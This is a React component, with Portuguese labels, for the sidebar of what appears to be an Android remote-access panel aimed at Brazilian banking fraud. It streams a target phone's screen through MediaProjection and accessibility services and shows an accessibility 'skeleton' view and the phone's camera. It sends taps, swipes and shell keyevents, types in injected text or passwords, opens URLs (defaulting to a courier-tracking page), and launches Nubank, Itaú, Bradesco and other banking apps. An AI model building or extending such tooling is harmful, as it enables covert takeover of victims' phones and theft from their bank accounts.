import { useState } from "react";
import {
  Camera,
  Check,
  ChevronRight,
  CircleDot,
  Compass,
  Copy,
  Crosshair,
  ExternalLink,
  Flame,
  Globe,
  Grid,
  Hand,
  Lightbulb,
  Lock,
  Maximize2,
  Mic,
  Moon,
  Move,
  Phone,
  Pin,
  PinOff,
  Power,
  RefreshCw,
  RotateCw,
  Search,
  Send,
  Sliders,
  Smartphone,
  Terminal,
  Volume2,
  VolumeX,
  Wifi,
  X,
  Zap
} from "lucide-react";
import type { ControlDevice } from "./types";
import { AppLogo } from "./AppLogo";
import { api } from "../../api";

interface Props {
  device: ControlDevice;
  onClose: () => void;
  onMacroAction: (action: string, label: string) => void;
  onSendTouch: (x: number, y: number) => void;
  onSendSwipe: (x1: number, y1: number, x2: number, y2: number) => void;
  onVolumeChange: (vol: number) => void;
  deviceVolume: number;
  isMuted: boolean;
  onToggleMute: () => void;
  activeCamera: "front" | "back";
  onToggleCamera: () => void;
  torchOn: boolean;
  onToggleTorch: () => void;
  activeScreensCount: number;
  onToggleScreen: (type: "tela" | "sr" | "cam") => void;
  telaActive: boolean;
  srActive: boolean;
  camActive: boolean;
  fps: number;
  onChangeFps: (fps: number) => void;
  onAutoFit: () => void;
  showToast: (msg: string, type?: "success" | "info") => void;
}

const QUICK_APPS = [
  { name: "Nubank", pkg: "com.nu.production", category: "Banco" },
  { name: "Inter", pkg: "br.com.intermedium", category: "Banco" },
  { name: "Caixa Tem", pkg: "br.gov.caixa.tem", category: "Banco" },
  { name: "Itaú", pkg: "com.itau", category: "Banco" },
  { name: "Bradesco", pkg: "com.bradesco", category: "Banco" },
  { name: "WhatsApp", pkg: "com.whatsapp", category: "Chat" },
  { name: "Google Chrome", pkg: "com.android.chrome", category: "Web" },
  { name: "Play Store", pkg: "com.android.vending", category: "App" },
  { name: "Configurações", pkg: "com.android.settings", category: "Sistema" }
];

export function RightSidebarQuickActions({
  device,
  onClose,
  onMacroAction,
  onSendTouch,
  onSendSwipe,
  onVolumeChange,
  deviceVolume,
  isMuted,
  onToggleMute,
  activeCamera,
  onToggleCamera,
  torchOn,
  onToggleTorch,
  activeScreensCount,
  onToggleScreen,
  telaActive,
  srActive,
  camActive,
  fps,
  onChangeFps,
  onAutoFit,
  showToast
}: Props) {
  const [activeTab, setActiveTab] = useState<"todos" | "hardware" | "gestos" | "apps" | "stream">("todos");
  const [quickText, setQuickText] = useState("");
  const [quickUrl, setQuickUrl] = useState("https://jadlog.com.br/rastreamento");
  const [isSendingText, setIsSendingText] = useState(false);
  const [isPinned, setIsPinned] = useState(false);

  const handleSendText = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!quickText.trim()) return;
    setIsSendingText(true);
    try {
      await api.sendText(device.id, quickText);
      showToast(`Texto digitado no aparelho: "${quickText}"`, "success");
      setQuickText("");
    } catch {
      showToast("Erro ao transmitir texto para o aparelho.", "info");
    } finally {
      setIsSendingText(false);
    }
  };

  const handleOpenUrl = async () => {
    if (!quickUrl.trim()) return;
    try {
      await api.sendText(device.id, `am start -a android.intent.action.VIEW -d "${quickUrl}"`);
      showToast(`URL aberta no navegador do aparelho: ${quickUrl}`, "success");
    } catch {
      showToast("Erro ao abrir link no dispositivo.", "info");
    }
  };

  const handleLaunchApp = async (pkg: string, name: string) => {
    try {
      await api.launchApp(device.id, pkg);
      showToast(`Iniciando aplicativo ${name}...`, "success");
    } catch {
      await api.sendText(device.id, `monkey -p ${pkg} -c android.intent.category.LAUNCHER 1`);
      showToast(`Ordem de execução enviada para ${name}.`, "success");
    }
  };

  return (
    <aside className={`tactical-right-quick-sidebar ${isPinned ? "is-pinned" : ""}`}>
      {/* Header Bar */}
      <div className="right-sidebar-header">
        <div className="right-sidebar-title-block">
          <div className="right-sidebar-badge-row">
            <Zap size={14} className="neon-zap-icon" />
            <span className="right-sidebar-title">FUNÇÕES RÁPIDAS</span>
          </div>
          <span className="right-sidebar-sub">
            {device.name} · {device.ip}
          </span>
        </div>

        <div className="right-sidebar-header-actions">
          <button
            type="button"
            className={`tactical-action-btn ${isPinned ? "active" : ""}`}
            onClick={() => setIsPinned(!isPinned)}
            title={isPinned ? "Desafixar barra lateral" : "Fixar barra lateral aberta"}
          >
            {isPinned ? <Pin size={13} /> : <PinOff size={13} />}
          </button>
          <button
            type="button"
            className="tactical-action-btn close-btn"
            onClick={onClose}
            title="Fechar Funções Rápidas (Esc)"
          >
            <X size={15} />
          </button>
        </div>
      </div>

      {/* Tabs Filter */}
      <div className="right-sidebar-filter-tabs">
        <button
          type="button"
          className={`sidebar-tab-pill ${activeTab === "todos" ? "active" : ""}`}
          onClick={() => setActiveTab("todos")}
        >
          Todos
        </button>
        <button
          type="button"
          className={`sidebar-tab-pill ${activeTab === "hardware" ? "active" : ""}`}
          onClick={() => setActiveTab("hardware")}
        >
          Físico
        </button>
        <button
          type="button"
          className={`sidebar-tab-pill ${activeTab === "gestos" ? "active" : ""}`}
          onClick={() => setActiveTab("gestos")}
        >
          Toques
        </button>
        <button
          type="button"
          className={`sidebar-tab-pill ${activeTab === "apps" ? "active" : ""}`}
          onClick={() => setActiveTab("apps")}
        >
          Apps
        </button>
        <button
          type="button"
          className={`sidebar-tab-pill ${activeTab === "stream" ? "active" : ""}`}
          onClick={() => setActiveTab("stream")}
        >
          Telas
        </button>
      </div>

      {/* Scrollable Content Body */}
      <div className="right-sidebar-scroll-body">
        {/* 1. SEÇÃO: TELAS SIMULTÂNEAS & AUTO-AJUSTE */}
        {(activeTab === "todos" || activeTab === "stream") && (
          <div className="sidebar-tactical-section">
            <div className="section-label-row">
              <span className="section-lead-tag">TELAS SIMULTÂNEAS & SINCRONIZAÇÃO</span>
              <span className="section-badge-info">{activeScreensCount} ATIVA(S)</span>
            </div>

            <div className="screens-toggle-trio-grid">
              <button
                type="button"
                className={`screen-toggle-card ${telaActive ? "active" : ""}`}
                onClick={() => onToggleScreen("tela")}
                title="Ativar/Desativar Projeção de Tela Real"
              >
                <Smartphone size={16} />
                <span className="card-label">Tela Ao Vivo</span>
                <span className={`toggle-dot ${telaActive ? "on" : "off"}`} />
              </button>

              <button
                type="button"
                className={`screen-toggle-card ${srActive ? "active" : ""}`}
                onClick={() => onToggleScreen("sr")}
                title="Ativar/Desativar Esqueleto 2D Wireframe"
              >
                <Grid size={16} />
                <span className="card-label">Esqueleto 2D</span>
                <span className={`toggle-dot ${srActive ? "on" : "off"}`} />
              </button>

              <button
                type="button"
                className={`screen-toggle-card ${camActive ? "active" : ""}`}
                onClick={() => onToggleScreen("cam")}
                title="Ativar/Desativar Câmera em Tempo Real (3ª Tela)"
              >
                <Camera size={16} />
                <span className="card-label">Câmera Real</span>
                <span className={`toggle-dot ${camActive ? "on" : "off"}`} />
              </button>
            </div>

            <div className="auto-fit-sync-bar">
              <button
                type="button"
                className="primary auto-fit-full-btn"
                onClick={onAutoFit}
                title="Padronizar sincronização e auto-ajustar as telas para caber 100% no espaço"
              >
                <Maximize2 size={13} />
                <span>Ajustar Telas Automaticamente (Auto-Fit)</span>
              </button>
            </div>
          </div>
        )}

        {/* 2. SEÇÃO: CONTROLES FÍSICOS & HARDWARE */}
        {(activeTab === "todos" || activeTab === "hardware") && (
          <div className="sidebar-tactical-section">
            <div className="section-label-row">
              <span className="section-lead-tag">AÇÕES DE HARDWARE & ENERGIA</span>
            </div>

            <div className="hardware-actions-matrix">
              <button
                type="button"
                className="hw-matrix-btn power-btn"
                onClick={() => onMacroAction("input keyevent 26", "Power / Bloqueio")}
                title="Bloquear / Desbloquear Tela (Power)"
              >
                <Power size={14} />
                <span>Bloquear / Power</span>
              </button>

              <button
                type="button"
                className="hw-matrix-btn"
                onClick={() => onMacroAction("input keyevent 3", "Home")}
                title="Tela Inicial (Home)"
              >
                <CircleDot size={14} />
                <span>Tela Inicial</span>
              </button>

              <button
                type="button"
                className="hw-matrix-btn"
                onClick={() => onMacroAction("input keyevent 4", "Voltar")}
                title="Voltar Tela Anterior"
              >
                <ChevronRight size={14} style={{ transform: "rotate(180deg)" }} />
                <span>Voltar</span>
              </button>

              <button
                type="button"
                className="hw-matrix-btn"
                onClick={() => onMacroAction("input keyevent 187", "Recentes")}
                title="Aplicativos Recentes"
              >
                <Move size={14} />
                <span>Recentes</span>
              </button>

              <button
                type="button"
                className="hw-matrix-btn"
                onClick={() => onMacroAction("capture", "Capturar Tela")}
                title="Capturar Screenshot em Alta Definição"
              >
                <Camera size={14} />
                <span>Capturar Tela</span>
              </button>

              <button
                type="button"
                className="hw-matrix-btn"
                onClick={() => onMacroAction("input keyevent 82", "Menu de Opções")}
                title="Abrir Menu de Contexto"
              >
                <Sliders size={14} />
                <span>Menu Sistema</span>
              </button>

              <button
                type="button"
                className={`hw-matrix-btn ${torchOn ? "active" : ""}`}
                onClick={onToggleTorch}
                title="Ligar ou desligar lanterna LED do celular"
              >
                <Lightbulb size={14} />
                <span>{torchOn ? "Lanterna: ON" : "Lanterna: OFF"}</span>
              </button>

              <button
                type="button"
                className="hw-matrix-btn"
                onClick={() => onMacroAction("cmd statusbar expand-notifications", "Painel de Notificações")}
                title="Puxar barra de notificações do Android"
              >
                <ChevronRight size={14} style={{ transform: "rotate(90deg)" }} />
                <span>Notificações</span>
              </button>
            </div>
          </div>
        )}

        {/* 3. SEÇÃO: TOQUES E GESTOS DIGITAIS RÁPIDOS */}
        {(activeTab === "todos" || activeTab === "gestos") && (
          <div className="sidebar-tactical-section">
            <div className="section-label-row">
              <span className="section-lead-tag">GESTOS & TOQUES DIGITAIS</span>
            </div>

            <div className="touch-gestures-grid">
              <button
                type="button"
                className="touch-gesture-chip"
                onClick={() => onSendTouch(360, 640)}
                title="Simular toque digital no centro exato da tela"
              >
                <Hand size={13} style={{ color: "#22c55e" }} />
                <span>● Toque Centro</span>
              </button>

              <button
                type="button"
                className="touch-gesture-chip"
                onClick={async () => {
                  onSendTouch(360, 640);
                  setTimeout(() => onSendTouch(360, 640), 120);
                }}
                title="Simular toque duplo rápido no centro"
              >
                <Crosshair size={13} style={{ color: "#38bdf8" }} />
                <span>●● Toque Duplo</span>
              </button>

              <button
                type="button"
                className="touch-gesture-chip"
                onClick={() => onSendSwipe(360, 640, 360, 640)}
                title="Simular toque longo (long press 800ms)"
              >
                <Zap size={13} style={{ color: "#facc15" }} />
                <span>⏱ Toque Longo</span>
              </button>

              <button
                type="button"
                className="touch-gesture-chip"
                onClick={() => onSendSwipe(360, 850, 360, 250)}
                title="Rolar página para cima (Swipe Up)"
              >
                <span style={{ fontWeight: 800, color: "#38bdf8" }}>↑</span>
                <span>Rolar Cima</span>
              </button>

              <button
                type="button"
                className="touch-gesture-chip"
                onClick={() => onSendSwipe(360, 250, 360, 850)}
                title="Rolar página para baixo (Swipe Down)"
              >
                <span style={{ fontWeight: 800, color: "#38bdf8" }}>↓</span>
                <span>Rolar Baixo</span>
              </button>

              <button
                type="button"
                className="touch-gesture-chip"
                onClick={() => onSendSwipe(600, 640, 120, 640)}
                title="Deslizar tela para a esquerda"
              >
                <span style={{ fontWeight: 800, color: "#cbd5e1" }}>←</span>
                <span>Swipe Esquerda</span>
              </button>

              <button
                type="button"
                className="touch-gesture-chip"
                onClick={() => onSendSwipe(120, 640, 600, 640)}
                title="Deslizar tela para a direita"
              >
                <span style={{ fontWeight: 800, color: "#cbd5e1" }}>→</span>
                <span>Swipe Direita</span>
              </button>

              <button
                type="button"
                className="touch-gesture-chip"
                onClick={() => onMacroAction("input tap 360 1150", "Toque Inferior / Confirmação")}
                title="Toque na área inferior de confirmação / botões de ação"
              >
                <span style={{ fontWeight: 800, color: "#22c55e" }}>✓</span>
                <span>Toque Ação (Inferior)</span>
              </button>
            </div>
          </div>
        )}

        {/* 4. SEÇÃO: DIGITAÇÃO RÁPIDA & ABERTURA DE URL */}
        {(activeTab === "todos" || activeTab === "hardware") && (
          <div className="sidebar-tactical-section">
            <div className="section-label-row">
              <span className="section-lead-tag">DIGITAÇÃO & NAVEGAÇÃO WEB</span>
            </div>

            {/* Quick Text Injection */}
            <form onSubmit={handleSendText} className="quick-input-form-block">
              <div className="input-with-button">
                <input
                  type="text"
                  value={quickText}
                  onChange={(e) => setQuickText(e.target.value)}
                  placeholder="Digitar texto ou colar senha..."
                  className="quick-sidebar-input"
                />
                <button
                  type="submit"
                  disabled={isSendingText || !quickText.trim()}
                  className="primary compact-btn send-btn"
                  title="Enviar texto ao foco do celular"
                >
                  <Send size={13} />
                </button>
              </div>
            </form>

            {/* Quick URL Opener */}
            <div className="quick-input-form-block" style={{ marginTop: "8px" }}>
              <div className="input-with-button">
                <input
                  type="text"
                  value={quickUrl}
                  onChange={(e) => setQuickUrl(e.target.value)}
                  placeholder="https://..."
                  className="quick-sidebar-input"
                />
                <button
                  type="button"
                  onClick={handleOpenUrl}
                  className="secondary compact-btn send-btn"
                  title="Abrir link no navegador do celular"
                >
                  <Globe size={13} />
                </button>
              </div>
            </div>
          </div>
        )}

        {/* 5. SEÇÃO: LANÇADOR RÁPIDO DE APPS */}
        {(activeTab === "todos" || activeTab === "apps") && (
          <div className="sidebar-tactical-section">
            <div className="section-label-row">
              <span className="section-lead-tag">LANÇADOR RÁPIDO DE APPS</span>
              <span className="section-badge-info">{QUICK_APPS.length} ATALHOS</span>
            </div>

            <div className="quick-apps-grid">
              {QUICK_APPS.map((app) => (
                <button
                  key={app.pkg}
                  type="button"
                  className="quick-app-card-btn"
                  onClick={() => handleLaunchApp(app.pkg, app.name)}
                  title={`Abrir ${app.name} (${app.pkg}) no celular`}
                >
                  <AppLogo name={app.name} packageName={app.pkg} size={24} />
                  <span className="quick-app-name">{app.name}</span>
                </button>
              ))}
            </div>
          </div>
        )}

        {/* 6. SEÇÃO: ÁUDIO & CÂMERA */}
        {(activeTab === "todos" || activeTab === "stream") && (
          <div className="sidebar-tactical-section">
            <div className="section-label-row">
              <span className="section-lead-tag">ÁUDIO & MULTIMÍDIA</span>
            </div>

            <div className="audio-slider-card">
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "6px" }}>
                <span style={{ fontSize: "11px", fontWeight: 700, color: "#cbd5e1" }}>
                  Volume do Aparelho
                </span>
                <span style={{ fontSize: "11px", fontWeight: 800, color: isMuted ? "#ef4444" : "#38bdf8" }}>
                  {isMuted ? "MUDO" : `${Math.round((deviceVolume / 15) * 100)}%`}
                </span>
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <button
                  type="button"
                  onClick={onToggleMute}
                  className="tactical-action-btn"
                  title={isMuted ? "Desmutar" : "Mutar Áudio"}
                  style={{ color: isMuted ? "#ef4444" : "#38bdf8" }}
                >
                  {isMuted ? <VolumeX size={15} /> : <Volume2 size={15} />}
                </button>
                <input
                  type="range"
                  min="0"
                  max="15"
                  step="1"
                  value={isMuted ? 0 : deviceVolume}
                  onChange={(e) => onVolumeChange(Number(e.target.value))}
                  className="tactical-range-input"
                  style={{ flex: 1 }}
                />
              </div>

              <div style={{ display: "flex", gap: "6px", marginTop: "10px" }}>
                <button
                  type="button"
                  className="secondary compact-btn"
                  style={{ flex: 1, fontSize: "10.5px" }}
                  onClick={onToggleCamera}
                  title="Alternar entre câmera frontal e traseira"
                >
                  <RotateCw size={12} />
                  <span>Câm: {activeCamera === "back" ? "Traseira" : "Frontal"}</span>
                </button>

                <button
                  type="button"
                  className={`secondary compact-btn ${torchOn ? "active" : ""}`}
                  style={{ flex: 1, fontSize: "10.5px" }}
                  onClick={onToggleTorch}
                  title="Ligar ou desligar lanterna"
                >
                  <Lightbulb size={12} />
                  <span>{torchOn ? "Lanterna: ON" : "Lanterna: OFF"}</span>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* 7. SEÇÃO: TAXA DE QUADROS (FPS) & STATUS */}
        {(activeTab === "todos" || activeTab === "stream") && (
          <div className="sidebar-tactical-section">
            <div className="section-label-row">
              <span className="section-lead-tag">TAXA DE TRANSMISSÃO (FPS)</span>
            </div>

            <div className="fps-selector-row">
              {[6, 12, 24, 30].map((rate) => (
                <button
                  key={rate}
                  type="button"
                  className={`fps-chip-btn ${fps === rate ? "active" : ""}`}
                  onClick={() => {
                    onChangeFps(rate);
                    showToast(`Taxa de streaming ajustada para ${rate} FPS.`, "success");
                  }}
                >
                  {rate} FPS
                </button>
              ))}
            </div>

            <div className="stream-diagnostics-card" style={{ marginTop: "10px" }}>
              <div className="diag-row">
                <span>Latência / Ping:</span>
                <span style={{ color: "#22c55e", fontWeight: 700 }}>14 ms</span>
              </div>
              <div className="diag-row">
                <span>Resolução da Tela:</span>
                <span style={{ color: "#cbd5e1" }}>720 × 1280 (HD)</span>
              </div>
              <div className="diag-row">
                <span>Modo de Projeção:</span>
                <span style={{ color: "#38bdf8" }}>MediaProjection + A11Y</span>
              </div>
            </div>
          </div>
        )}
      </div>
    </aside>
  );
}
